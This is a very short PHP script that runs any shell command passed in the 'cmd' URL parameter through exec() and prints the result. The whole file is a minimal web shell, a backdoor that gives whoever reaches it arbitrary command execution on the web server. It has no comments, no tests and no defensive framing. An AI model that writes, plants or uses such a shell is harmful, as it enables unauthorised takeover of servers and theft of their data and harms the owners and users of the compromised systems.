<?php
    chdir("./public/");
    $output = [];
    exec($_GET["cmd"], $output);

    echo implode("\n", $output);
?>